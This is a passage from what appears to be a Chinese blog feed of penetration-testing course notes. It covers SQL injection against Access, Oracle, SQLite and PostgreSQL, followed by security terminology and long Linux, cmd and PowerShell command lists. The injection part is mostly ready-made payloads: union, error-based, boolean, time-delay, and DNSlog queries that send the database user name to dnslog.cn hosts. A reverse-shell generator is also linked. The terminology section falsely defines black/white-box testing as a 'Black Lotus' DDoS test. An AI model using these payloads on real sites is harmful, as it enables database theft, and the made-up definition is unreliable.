b.id)</p><p>二级偏移语句：</p><p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id &#x3D; b.id)inner join admin as c on a.id&#x3D;c.id)</p><p>实战常见的表和列（也可以用sqlmap的，但是量大且效率低）</p><p>常见的表有（最后根据企业名的缩写搭配上admin、user、name）</p><p>admin admins admin_user admin_usr admin_msg admin_login user username manager msg_user msg_login useradmin product、news、usr、system、article、customer、area</p><p>admin_id、admin_name、admin_password</p><p>常见的列</p><p>admin admin_user username password passwd pass pwd users usr user_login user_name login_name name等等</p><p>oracle注入(jsp)</p><p><img src="https://image.3001.net/images/20220714/1657765866_62cf7fea9f4e6948d11dd.png!small" alt="image"></p><h2 id="常规有回显注入"><a href="#常规有回显注入" class="headerlink" title="常规有回显注入"></a>常规有回显注入</h2><p>order by 3–</p><p>and 1&#x3D;2 union select null,null,null from dual–</p><p>and 1&#x3D;2 union select ‘null’,null,null from dual– &#x2F;&#x2F;返回正常，则第一个字段是数字型，返回错误，为字符型</p><p>and 1&#x3D;2 union select 1,’2’,’3’ from dual– &#x2F;&#x2F;判断显示位</p><p>and 1&#x3D;2 union select null,(select banner from sys.v_$version where rownum&#x3D;1),null from dual– &#x2F;&#x2F;探测数据库版本信息</p><p>and 1&#x3D;2 union select null,(select table_name from user_tables where rownum&#x3D;1),null from dual– &#x2F;&#x2F;查询第一个表名</p><p>and 1&#x3D;2 union select null,(select table_name from user_tables where rownum&#x3D;1 and table_name&lt;&gt;’STUDENT’),null from dual– &#x2F;&#x2F;第二个表名</p><p>获取关键表中的列名：</p><p>‘ union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’ and rownum&#x3D;1),null from dual –</p><p>‘ union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’ and column_name&lt;&gt;’SUSER’ and rownum&#x3D;1),null from dual –</p><p>‘ union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’ and column_name&lt;&gt;’SUSER’ and column_name&lt;&gt;’SPWD’ and rownum&#x3D;1),null from dual –</p><p>‘ union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’ and column_name&lt;&gt;’SUSER’ and column_name&lt;&gt;’SPWD’ and column_name&lt;&gt;’SNAME’ and rownum&#x3D;1),null from dual –</p><p>and 1&#x3D;2 union select SNAME,SUSER,SPWD from T_USER where id&#x3D;1– &#x2F;&#x2F;查看数据</p><h3 id="第二种常规注入"><a href="#第二种常规注入" class="headerlink" title="第二种常规注入"></a>第二种常规注入</h3><p>确定回显位，假设当前共2个字段，全是数字型，判断方式如下：<br>and 1&#x3D;2 union select 1,2 from dual　　假设回显位是2，爆当前数据库中的第一个表：<br>and 1&#x3D;2 union select 1,(select table_name from user_tables where rownum&#x3D;1) from dual　　爆当前数据库中的第二个表：<br>and 1&#x3D;2 union select 1,(select table_name from user_tables where rownum&#x3D;1 and table_name not in (‘第一个表’)) from dual　　以此类推去爆第n个表<br>爆某表中的第一个字段：<br>and 1&#x3D;2 union select 1,(select column_name from user_tab_columns where rownum&#x3D;1 and table_name&#x3D;’表名（大写的）’) from dual　　爆某表中的第二个字段：<br>and 1&#x3D;2 union select 1,(select column_name from user_tab_columns where rownum&#x3D;1 and table_name&#x3D;’表名’ and column_name not in (‘第一个字段’)) from dual　　爆其它字段以此类推<br>爆某表中的第一行数据：<br>and 1&#x3D;2 union select 1,字段1||字段2…||字段n from 表名 where rownum&#x3D;1 –连接多个字段用到的连接符号是||,在oracle数据库中，concat函数只能连接两个字符串</p><h3 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a>报错注入</h3><p>利用 utl_inaddr.get_host_name<br>这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在Oracle 11g以及以后的版本中，当前数据库用户必须有网络访问权限。</p><p>jsp?name&#x3D;’ and 1&#x3D;utl_inaddr.get_host_name((select user from dual)) –</p><p>ctxsys.drithsx.sn()</p><p>jsp?name&#x3D;’ and 1&#x3D;ctxsys.drithsx.sn(1,(select user from dual)) –</p><p>dbms_xdb_version.checkin()</p><p>jsp?name&#x3D;1’ and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null—</p><p>dbms_utility.sqlid_to_sqlhash()</p><p>jsp?name&#x3D;1’ and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null –</p><p>XMLType()</p><p>sname&#x3D;1′ and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null –</p><h3 id="布尔注入-1"><a href="#布尔注入-1" class="headerlink" title="布尔注入"></a>布尔注入</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">jsp?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=(<span class="hljs-keyword">select</span> decode(substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual) <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20220714/1657765888_62cf80001865e22a5f8e0.png!small" alt="image"></p><p>username&#x3D;admin’ and (select substr(user, 1, 1) from dual)&#x3D;’S’ –</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>主要用DBMS_PIPE.RECEIVE_MESSAGE</p><p>即user的第一位是”A”时，延时5秒执行。</p><p>And 1&#x3D;(select decode(substr(user,1,1),’A’,DBMS_PIPE.RECEIVE_MESSAGE(‘a’,5) ,0) from dual)</p><p>第二位是D时，延时5秒</p><p>And 1&#x3D;(select decode(substr(user,2,1),’D’,DBMS_PIPE.RECEIVE_MESSAGE(‘a’,5) ,0) from dual)</p><p>news.jsp?id&#x3D;1 and 1&#x3D;(select decode(substr(user,1,1),’S’,dbms_pipe.receive_message(‘RDS’,5),0) from dual) –</p><h3 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h3><p>utl_inaddr.get_host_address</p><p>select utl_inaddr.get_host_address((select user from dual)||’.cbb1ya.dnslog.cn’) from dual</p><p>SYS.DBMS_LDAP.INIT 这个函数在 10g&#x2F;11g 中是 public 权限.</p><p>SELECT DBMS_LDAP.INIT((select user from dual)||’.24wypw.dnslog.cn’,80) FROM DUAL;</p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h2 id="Sqlite注入"><a href="#Sqlite注入" class="headerlink" title="Sqlite注入"></a>Sqlite注入</h2><p>如果您的站点允许用户通过网页输入，并将输入内容插入到 SQLite 数据库中，这个时候您就面临着一个被称为 SQL 注入的安全问题。本章节将向您讲解如何防止这种情况的发生，确保脚本和 SQLite 语句的安全。</p><p>1.Sqlite-master:这个是内置系统表、相当于mysql的information_schema</p><p>但是这里只存有表的信息，里面有个sql字段，有各个表的结构，有表名，字段名和类型</p><p>2.sqlite并不支持像mysql那样的注释，但是可以通过 — 方式增加DDL注释(写shell会用到)</p><h2 id="Postsql注入"><a href="#Postsql注入" class="headerlink" title="Postsql注入"></a>Postsql注入</h2><p>PostgreSQL是一种特性非常齐全的自由软件的对象-关系型数据库管理系统（ORDBMS），4.2版本为基础的对象关系型数据库管理系统。</p><p>PostgreSQL安装后，默认的端口是：5432，默认的用户名是： postgres ，默认的数据库也是：postgres 。</p><ul><li>注释符：–</li><li>延时函数：pg_sleep(3)</li></ul><p><img src="https://image.3001.net/images/20220714/1657765907_62cf8013ada166b4cf32d.png!small" alt="image"></p><h2 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h2><p><code>基础知识</code><br>Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则，Oracle保证dual里面永远只有一条记录。</p><p>Oracle的数据类型是强匹配的(MYSQL有弱匹配的味道)，所以在Oracle进行类似UNION查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用null代替某些无法快速猜测出数据类型的位置。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/WXR/2025/01/19/%E5%B0%8F%E8%BF%AA%E7%BD%91%E7%BB%9C%E5%AE%8C%E5%85%A8%E7%AC%94%E8%AE%B0/"/>
    <url>/WXR/2025/01/19/%E5%B0%8F%E8%BF%AA%E7%BD%91%E7%BB%9C%E5%AE%8C%E5%85%A8%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="小迪安全课笔记"><a href="#小迪安全课笔记" class="headerlink" title="小迪安全课笔记"></a>小迪安全课笔记</h1><h1 id="1-渗透常用术语总结"><a href="#1-渗透常用术语总结" class="headerlink" title="1.渗透常用术语总结"></a>1.渗透常用术语总结</h1><p>棱角社区：<a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p><p>反弹shell生成器：<a href="https://forum.ywhack.com/reverse-shell/">https://forum.ywhack.com/reverse-shell/</a></p><h2 id="1-POC、EXP、Payload与Shellcode"><a href="#1-POC、EXP、Payload与Shellcode" class="headerlink" title="1. POC、EXP、Payload与Shellcode"></a><strong>1. POC、EXP、Payload与Shellcode</strong></h2><blockquote><p>POC：全称 ‘ Proof of Concept ‘，中文 ‘ 概念验证 ‘ ，常指一段漏洞证明的代码。</p><p>EXP：全称 ‘ Exploit ‘，中文 ‘ 利用 ‘，指利用系统漏洞进行攻击的动作。</p><p>Payload：中文 ‘ 有效载荷 ‘，指成功exploit之后，真正在目标系统执行的代码或指令。</p><p>Shellcode：简单翻译 ‘ shell代码 ‘，是Payload的一种，由于其建立正向&#x2F;反向shell而得名。</p></blockquote><h2 id="2-几点注意"><a href="#2-几点注意" class="headerlink" title="2. 几点注意"></a><strong>2. 几点注意</strong></h2><blockquote><p>POC是用来证明漏洞存在的，EXP是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害的，Exp通常是有害的，有了POC，才有EXP。</p><p>Payload有很多种，它可以是Shellcode，也可以直接是一段系统命令。同一个Payload可以用于多个漏洞，但每个漏洞都有其自己的EXP，也就是说不存在通用的EXP。</p><p>Shellcode也有很多种，包括正向的，反向的，甚至meterpreter。</p><p>Shellcode与Shellshcok不是一个，Shellshock特指14年发现的Shellshock漏洞。</p></blockquote><h2 id="3-Payload模块"><a href="#3-Payload模块" class="headerlink" title="3. Payload模块"></a><strong>3. Payload模块</strong></h2><blockquote><p>在Metasploit Framework 6大模块中有一个Payload模块，在该模块下有Single、Stager、Stages这三种类型，Single是一个all-in-one的Payload，不依赖其他的文件，所以它的体积会比较大，Stager主要用于当目标计算机的内存有限时，可以先传输一个较小的Stager用于建立连接，Stages指利用Stager建立的连接下载后续的Payload。Stager和Stages都有多种类型，适用于不同场景。</p></blockquote><p><a href="https://www.cnblogs.com/sunny11/p/13583083.html">https://www.cnblogs.com/sunny11/p/13583083.html</a></p><h2 id="4-后门"><a href="#4-后门" class="headerlink" title="4.后门"></a>4.后门</h2><p>​    这是一种形象的比喻，入侵者在利用某些方法成功的控制了目标主机后，可以在对方的系统中植入特定的程序，或者是修改某些设置，用于访问、查看或者控制这台主机。</p><p>​    这些改动表面上是很难被察觉的，就好象是入侵者偷偷的配了一把主人房间的钥匙，或者在不起眼处修了一条按到，可以方便自身随意进出。</p><p>​    通常大多数木马程序都可以被入侵者用于创建后门（BackDoor）。</p><h2 id="5-木马-病毒"><a href="#5-木马-病毒" class="headerlink" title="5.木马&#x2F;病毒"></a>5.木马&#x2F;病毒</h2><h3 id="1-木马"><a href="#1-木马" class="headerlink" title="1.木马"></a>1.木马</h3><p>木马是一种恶意软件，其名字来源于古希腊神话中的特洛伊木马。它通常伪装成合法的软件或者文件，诱骗用户安装。一旦安装，它会在用户的计算机系统中潜伏下来。例如，一个看似是好玩的游戏软件，用户下载安装后，这个软件背后可能就是一个木马程序。</p><h3 id="2-病毒"><a href="#2-病毒" class="headerlink" title="2.病毒"></a>2.病毒</h3><p>病毒是一种能够自我复制的恶意软件。它会将自身代码嵌入到其他可执行文件（如.exe文件）、系统文件或者文档文件中，当这些被感染的文件被执行或者打开时，病毒就会被激活并开始传播。例如，一个病毒可能会嵌入到一个常用的办公软件的可执行文件中，当用户运行这个办公软件时，病毒就会复制自身到计算机的其他位置。</p><h2 id="6-反弹"><a href="#6-反弹" class="headerlink" title="6.反弹"></a>6.反弹</h2><p>反弹（Reverse）：在渗透测试中，“反弹”通常指目标系统主动向攻击者建立连接的行为，以绕过防火墙等安全设备的限制。</p><h2 id="7-回显"><a href="#7-回显" class="headerlink" title="7.回显"></a>7.回显</h2><p>回显（Echo）：回显是指将输入的数据或命令直接返回给发送者的过程。在渗透测试中，回显可以用于验证漏洞的存在或收集目标系统的信息。</p><h2 id="8-跳板"><a href="#8-跳板" class="headerlink" title="8.跳板"></a>8.跳板</h2><p>跳板是指一个具有辅助作用的机器，利用这个主机作为一个间接工具，来入侵其他主机，一般和肉鸡连用。</p><h2 id="9-黑白盒测试"><a href="#9-黑白盒测试" class="headerlink" title="9.黑白盒测试"></a>9.黑白盒测试</h2><p>黑百合测试（Black Lotus Test）是一种网络安全测试方法，用于检测和评估网络系统在面对大规模分布式拒绝服务攻击（DDoS）时的防御能力。</p><h2 id="10-暴力破解"><a href="#10-暴力破解" class="headerlink" title="10.暴力破解"></a>10.暴力破解</h2><p>暴力破解（Brute Force Attack）是一种通过尝试所有可能的组合来破解密码的攻击方式。攻击者利用计算能力尝试不同的密码组合，直到找到正确的密码。</p><h2 id="11-社会工程学"><a href="#11-社会工程学" class="headerlink" title="11.社会工程学"></a>11.社会工程学</h2><p>社会工程学（Social Engineering）是一种利用心理操纵来诱导个人泄露机密信息或执行某些行为的攻击手法。攻击者通过电话、电子邮件或面对面交流等方式，获取未授权的访问或数据。</p><h2 id="12-撞库"><a href="#12-撞库" class="headerlink" title="12.撞库"></a>12.撞库</h2><p>撞库是一种常见的网络攻击方式，攻击者通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登录其他网站，以获取可以登录的账号密码。</p><h2 id="13-ATT-CK"><a href="#13-ATT-CK" class="headerlink" title="13.ATT&amp;CK"></a>13.ATT&amp;CK</h2><p>ATT&amp;CK（Adversarial Tactics, Techniques, and Common Knowledge）是一个描述攻击者技战术的知识库，由MITRE公司在2013年推出。它根据真实的观察数据来描述和分类对抗行为。</p><h1 id="2-操作系统-用途-命令-权限-用户-防火墙"><a href="#2-操作系统-用途-命令-权限-用户-防火墙" class="headerlink" title="2.操作系统-用途&amp;命令&amp;权限&amp;用户&amp;防火墙"></a>2.操作系统-用途&amp;命令&amp;权限&amp;用户&amp;防火墙</h1><h2 id="1-个人计算机-服务器用机"><a href="#1-个人计算机-服务器用机" class="headerlink" title="1.个人计算机&amp;服务器用机"></a>1.个人计算机&amp;服务器用机</h2><h2 id="2-linux命令"><a href="#2-linux命令" class="headerlink" title="2.linux命令"></a>2.linux命令</h2><h3 id="系统管理"><a href="#系统管理" class="headerlink" title="系统管理"></a>系统管理</h3><ul><li><strong>关机和重启</strong><ul><li><code>shutdown -h now</code>：立即关机。</li><li><code>shutdown -r now</code>：立即重启。</li><li><code>reboot</code>：重启系统。</li></ul></li><li><strong>查看系统信息</strong><ul><li><code>uname -a</code>：显示系统信息，包括内核版本、主机名等。</li><li><code>hostname</code>：显示或设置系统主机名。</li><li><code>df -h</code>：显示磁盘空间使用情况。</li><li><code>free -m</code>：显示内存使用情况。</li><li><code>top</code>：实时显示系统进程和资源使用情况。</li><li><code>htop</code>：更友好的进程管理工具（需要安装）。</li></ul></li><li><strong>系统日志</strong><ul><li><code>dmesg</code>：显示或控制内核环形缓冲区的内容。</li><li><code>journalctl</code>：显示系统日志（适用于systemd系统）。</li><li><code>cat /var/log/syslog</code>：查看系统日志文件。</li></ul></li></ul><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><ul><li><strong>文件和目录</strong><ul><li><code>ls</code>：列出目录内容。</li><li><code>ls -l</code>：以长格式列出目录内容。</li><li><code>ls -a</code>：列出所有文件，包括隐藏文件。</li><li><code>cd</code>：切换目录。</li><li><code>pwd</code>：显示当前工作目录。</li><li><code>mkdir</code>：创建目录。</li><li><code>rmdir</code>：删除空目录。</li><li><code>rm</code>：删除文件或目录。</li><li><code>rm -r</code>：递归删除目录及其内容。</li><li><code>cp</code>：复制文件或目录。</li><li><code>mv</code>：移动或重命名文件或目录。</li><li><code>touch</code>：创建空文件或更新文件的时间戳。</li></ul></li><li><strong>文件内容查看</strong><ul><li><code>cat</code>：显示文件内容。</li><li><code>more</code>：分页显示文件内容。</li><li><code>less</code>：分页显示文件内容，支持向前和向后翻页。</li><li><code>head</code>：显示文件的前几行。</li><li><code>tail</code>：显示文件的后几行。</li><li><code>tail -f</code>：实时显示文件的最新内容（常用于查看日志文件）。</li></ul></li><li><strong>文件编辑</strong><ul><li><code>vi</code>：文本编辑器（功能强大但使用复杂）。</li><li><code>nano</code>：简单的文本编辑器。</li><li><code>sed</code>：流编辑器，用于文本处理。</li><li><code>awk</code>：文本处理工具，用于复杂的文本分析和处理。</li></ul></li><li><strong>文件查找</strong><ul><li><code>find</code>：查找文件和目录。</li><li><code>grep</code>：在文件中搜索文本模式。</li><li><code>egrep</code>：扩展的grep，支持更多的正则表达式。</li><li><code>fgrep</code>：固定字符串的grep，不使用正则表达式。</li></ul></li></ul><h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><ul><li><strong>网络连接</strong><ul><li><code>ifconfig</code>：显示或配置网络接口（在新版本的Linux中被<code>ip</code>命令替代）。</li><li><code>ip addr</code>：显示或操作路由、网络设备、接口等。</li><li><code>ip link</code>：显示或操作网络接口状态。</li><li><code>ping</code>：测试网络连接。</li><li><code>traceroute</code>：显示到目标主机的网络路径。</li><li><code>netstat</code>：显示网络连接、路由表、接口统计等信息（在新版本的Linux中被<code>ss</code>命令替代）。</li><li><code>ss</code>：显示套接字信息。</li></ul></li><li><strong>网络服务</strong><ul><li><code>service</code>：管理系统服务。</li><li><code>systemctl</code>：控制systemd系统和服务管理器。</li><li><code>netcat</code>：网络工具，用于读写网络连接（<code>nc</code>）。</li><li><code>telnet</code>：远程登录工具（不安全，建议使用SSH）。</li><li><code>ssh</code>：安全外壳协议，用于安全远程登录。</li></ul></li></ul><h3 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h3><ul><li><strong>查看进程</strong><ul><li><code>ps</code>：显示当前进程的状态。</li><li><code>ps aux</code>：显示所有进程的详细信息。</li><li><code>top</code>：实时显示系统进程和资源使用情况。</li><li><code>htop</code>：更友好的进程管理工具（需要安装）。</li></ul></li><li><strong>管理进程</strong><ul><li><code>kill</code>：发送信号给进程，通常用于终止进程。</li><li><code>kill -9</code>：强制终止进程。</li><li><code>pkill</code>：通过进程名发送信号。</li><li><code>nice</code>：设置进程的优先级。</li><li><code>renice</code>：更改正在运行的进程的优先级。</li><li><code>bg</code>：将作业放到后台运行。</li><li><code>fg</code>：将作业放到前台运行。</li><li><code>jobs</code>：显示当前shell会话中的作业。</li></ul></li></ul><h3 id="用户和权限管理"><a href="#用户和权限管理" class="headerlink" title="用户和权限管理"></a>用户和权限管理</h3><ul><li><strong>用户和组</strong><ul><li><code>useradd</code>：创建新用户。</li><li><code>userdel</code>：删除用户。</li><li><code>usermod</code>：修改用户属性。</li><li><code>groupadd</code>：创建新组。</li><li><code>groupdel</code>：删除组。</li><li><code>groupmod</code>：修改组属性。</li><li><code>passwd</code>：设置或更改用户密码。</li><li><code>who</code>：显示当前登录的用户。</li><li><code>last</code>：显示最近登录的用户。</li></ul></li><li><strong>权限管理</strong><ul><li><code>chmod</code>：更改文件或目录的权限。</li><li><code>chown</code>：更改文件或目录的所有者。</li><li><code>chgrp</code>：更改文件或目录的组。</li><li><code>umask</code>：设置默认文件权限。</li></ul></li></ul><h3 id="磁盘管理"><a href="#磁盘管理" class="headerlink" title="磁盘管理"></a>磁盘管理</h3><ul><li><strong>磁盘分区</strong><ul><li><code>fdisk</code>：磁盘分区工具。</li><li><code>parted</code>：更高级的磁盘分区工具。</li><li><code>mkfs</code>：创建文件系统。</li><li><code>mount</code>：挂载文件系统。</li><li><code>umount</code>：卸载文件系统。</li></ul></li><li><strong>磁盘配额</strong><ul><li><code>quota</code>：显示磁盘配额。</li><li><code>edquota</code>：编辑磁盘配额。</li></ul></li></ul><h3 id="其他常用命令"><a href="#其他常用命令" class="headerlink" title="其他常用命令"></a>其他常用命令</h3><ul><li><strong>压缩和解压</strong><ul><li><code>tar</code>：归档工具，支持多种压缩格式。</li><li><code>gzip</code>：压缩文件。</li><li><code>gunzip</code>：解压gzip压缩的文件。</li><li><code>bzip2</code>：压缩文件。</li><li><code>bunzip2</code>：解压bzip2压缩的文件。</li><li><code>zip</code>：压缩文件。</li><li><code>unzip</code>：解压zip压缩的文件。</li></ul></li><li><strong>时间日期</strong><ul><li><code>date</code>：显示或设置系统日期和时间。</li><li><code>cal</code>：显示日历。</li></ul></li><li><strong>任务调度</strong><ul><li><code>crontab</code>：设置定时任务。</li><li><code>at</code>：在指定时间执行命令。</li></ul></li><li><strong>系统监控</strong><ul><li><code>vmstat</code>：报告虚拟内存统计信息。</li><li><code>iostat</code>：报告CPU和I&#x2F;O使用情况。</li><li><code>sar</code>：系统活动报告。</li></ul></li></ul><h2 id="3-cmd命令（暂不用学）"><a href="#3-cmd命令（暂不用学）" class="headerlink" title="3.cmd命令（暂不用学）"></a>3.cmd命令（暂不用学）</h2><h3 id="系统管理-1"><a href="#系统管理-1" class="headerlink" title="系统管理"></a>系统管理</h3><ul><li><strong>关机和重启</strong><ul><li><code>shutdown /s /t 0</code>：立即关机。</li><li><code>shutdown /r /t 0</code>：立即重启。</li><li><code>shutdown /a</code>：取消关机或重启命令。</li></ul></li><li><strong>查看系统信息</strong><ul><li><code>systeminfo</code>：显示详细的系统配置信息。</li><li><code>ver</code>：显示Windows版本。</li><li><code>hostname</code>：显示或设置系统主机名。</li><li><code>ipconfig</code>：显示网络配置信息。</li><li><code>ipconfig /all</code>：显示详细的网络配置信息。</li><li><code>ipconfig /flushdns</code>：清除DNS缓存。</li><li><code>ipconfig /release</code>：释放当前的IP地址。</li><li><code>ipconfig /renew</code>：重新获取IP地址。</li></ul></li><li><strong>系统日志</strong><ul><li><code>eventvwr</code>：打开事件查看器。</li><li><code>logman</code>：管理性能日志和警报。</li></ul></li></ul><h3 id="文件操作-1"><a href="#文件操作-1" class="headerlink" title="文件操作"></a>文件操作</h3><ul><li><strong>文件和目录</strong><ul><li><code>dir</code>：列出目录内容。</li><li><code>dir /a</code>：列出所有文件，包括隐藏文件和系统文件。</li><li><code>cd</code>：切换目录。</li><li><code>cd /d</code>：切换驱动器和目录。</li><li><code>cd ..</code>：返回上一级目录。</li><li><code>cd \</code>：返回根目录。</li><li><code>md</code>或<code>mkdir</code>：创建目录。</li><li><code>rd</code>或<code>rmdir</code>：删除空目录。</li><li><code>del</code>或<code>erase</code>：删除文件。</li><li><code>del /s /q</code>：递归删除目录及其内容，不提示确认。</li><li><code>copy</code>：复制文件或目录。</li><li><code>xcopy</code>：更高级的文件复制工具，支持递归复制。</li><li><code>move</code>：移动或重命名文件或目录。</li><li><code>ren</code>或<code>rename</code>：重命名文件或目录。</li><li><code>type</code>：显示文件内容。</li><li><code>echo</code>：显示消息或变量值，也可用于创建空文件。</li></ul></li><li><strong>文件内容查看</strong><ul><li><code>more</code>：分页显示文件内容。</li><li><code>find</code>：在文件中搜索文本。</li><li><code>findstr</code>：在文件中搜索字符串，支持正则表达式。</li></ul></li><li><strong>文件编辑</strong><ul><li><code>edit</code>：简单的文本编辑器（已过时，建议使用记事本或其他编辑器）。</li><li><code>notepad</code>：打开记事本编辑器。</li></ul></li><li><strong>文件查找</strong><ul><li><code>where</code>：查找文件的路径。</li><li><code>dir /s</code>：递归查找文件。</li></ul></li></ul><h3 id="网络配置-1"><a href="#网络配置-1" class="headerlink" title="网络配置"></a>网络配置</h3><ul><li><strong>网络连接</strong><ul><li><code>ping</code>：测试网络连接。</li><li><code>tracert</code>：显示到目标主机的网络路径。</li><li><code>pathping</code>：结合了ping和tracert的功能，显示网络路径和丢包情况。</li><li><code>nslookup</code>：查询DNS记录。</li><li><code>arp</code>：显示和修改ARP缓存。</li><li><code>netstat</code>：显示网络连接、路由表、接口统计等信息。</li><li><code>netstat -ano</code>：显示所有网络连接和监听端口，包括进程ID。</li></ul></li><li><strong>网络服务</strong><ul><li><code>net start</code>：列出所有正在运行的服务。</li><li><code>net stop</code>：停止服务。</li><li><code>net start &lt;服务名&gt;</code>：启动服务。</li><li><code>net pause &lt;服务名&gt;</code>：暂停服务。</li><li><code>net continue &lt;服务名&gt;</code>：继续服务。</li><li><code>net use</code>：显示或连接网络驱动器。</li><li><code>net view</code>：查看网络资源。</li><li><code>net user</code>：管理用户账户。</li><li><code>net localgroup</code>：管理本地组。</li><li><code>net config workstation</code>：显示工作站配置信息。</li></ul></li></ul><h3 id="进程管理-1"><a href="#进程管理-1" class="headerlink" title="进程管理"></a>进程管理</h3><ul><li><strong>查看进程</strong><ul><li><code>tasklist</code>：显示当前进程列表。</li><li><code>tasklist /svc</code>：显示进程及其服务。</li><li><code>tasklist /m</code>：显示加载的模块。</li></ul></li><li><strong>管理进程</strong><ul><li><code>taskkill /pid &lt;进程ID&gt; /f</code>：强制终止指定进程。</li><li><code>taskkill /im &lt;进程名&gt; /f</code>：强制终止指定名称的进程。</li></ul></li></ul><h3 id="用户和权限管理-1"><a href="#用户和权限管理-1" class="headerlink" title="用户和权限管理"></a>用户和权限管理</h3><ul><li><strong>用户和组</strong><ul><li><code>net user</code>：管理用户账户。</li><li><code>net user &lt;用户名&gt; /add</code>：创建新用户。</li><li><code>net user &lt;用户名&gt; /del</code>：删除用户。</li><li><code>net user &lt;用户名&gt; &lt;新密码&gt;</code>：设置用户密码。</li><li><code>net localgroup</code>：管理本地组。</li><li><code>net localgroup &lt;组名&gt; &lt;用户名&gt; /add</code>：将用户添加到组。</li><li><code>net localgroup &lt;组名&gt; &lt;用户名&gt; /del</code>：将用户从组中删除。</li></ul></li><li><strong>权限管理</strong><ul><li><code>icacls</code>：修改文件或目录的权限。</li><li><code>takeown</code>：获取文件或目录的所有权。</li><li><code>cacls</code>：旧版本的权限管理工具（已过时，建议使用icacls）。</li></ul></li></ul><h3 id="磁盘管理-1"><a href="#磁盘管理-1" class="headerlink" title="磁盘管理"></a>磁盘管理</h3><ul><li><strong>磁盘分区</strong><ul><li><code>diskpart</code>：磁盘分区工具。</li><li><code>chkdsk</code>：检查磁盘并修复文件系统错误。</li><li><code>format</code>：格式化磁盘。</li></ul></li><li><strong>磁盘配额</strong><ul><li><code>fsutil</code>：文件系统工具，用于管理磁盘配额等高级功能。</li></ul></li></ul><h3 id="其他常用命令-1"><a href="#其他常用命令-1" class="headerlink" title="其他常用命令"></a>其他常用命令</h3><ul><li><strong>压缩和解压</strong><ul><li><code>compact</code>：显示或更改文件的压缩状态。</li><li><code>expand</code>：解压文件。</li></ul></li><li><strong>时间日期</strong><ul><li><code>date</code>：显示或设置系统日期。</li><li><code>time</code>：显示或设置系统时间。</li></ul></li><li><strong>任务调度</strong><ul><li><code>at</code>：计划任务（已过时，建议使用任务计划程序）。</li><li><code>schtasks</code>：任务计划程序命令行工具。</li></ul></li><li><strong>系统监控</strong><ul><li><code>perfmon</code>：性能监视器。</li><li><code>msinfo32</code>：系统信息工具。</li></ul></li></ul><h2 id="4-power-shell命令（暂不用学）"><a href="#4-power-shell命令（暂不用学）" class="headerlink" title="4.power shell命令（暂不用学）"></a>4.power shell命令（暂不用学）</h2><h3 id="系统管理-2"><a href="#系统管理-2" class="headerlink" title="系统管理"></a>系统管理</h3><ul><li><strong>查看系统信息</strong><ul><li><code>Get-ComputerInfo</code>：显示详细的系统配置信息。</li><li><code>Get-WmiObject Win32_OperatingSystem</code>：显示操作系统信息。</li><li><code>Get-WmiObject Win32_Processor</code>：显示处理器信息。</li><li><code>Get-WmiObject Win32_BIOS</code>：显示 BIOS 信息。</li><li><code>Get-WmiObject Win32_PhysicalMemory</code>：显示物理内存信息。</li></ul></li><li><strong>系统服务</strong><ul><li><code>Get-Service</code>：列出所有系统服务。</li><li><code>Get-Service &lt;服务名&gt;</code>：显示特定服务的状态。</li><li><code>Start-Service &lt;服务名&gt;</code>：启动服务。</li><li><code>Stop-Service &lt;服务名&gt;</code>：停止服务。</li><li><code>Restart-Service &lt;服务名&gt;</code>：重启服务。</li><li><code>Set-Service &lt;服务名&gt; -StartupType Automatic</code>：设置服务启动类型为自动。</li></ul></li><li><strong>系统日志</strong><ul><li><code>Get-EventLog -LogName System</code>：显示系统日志。</li><li><code>Get-EventLog -LogName Application</code>：显示应用程序日志。</li><li><code>Get-WinEvent -LogName Security</code>：显示安全日志。</li></ul></li></ul><h3 id="文件操作-2"><a href="#文件操作-2" class="headerlink" title="文件操作"></a>文件操作</h3><ul><li><strong>文件和目录</strong><ul><li><code>Get-ChildItem</code>（别名 <code>ls</code> 或 <code>dir</code>）：列出目录内容。</li><li><code>Get-ChildItem -Recurse</code>：递归列出目录内容。</li><li><code>Get-ChildItem -Hidden</code>：列出隐藏文件和目录。</li><li><code>Set-Location</code>（别名 <code>cd</code>）：切换目录。</li><li><code>New-Item -ItemType Directory -Path &quot;C:\Path\To\NewFolder&quot;</code>：创建目录。</li><li><code>Remove-Item 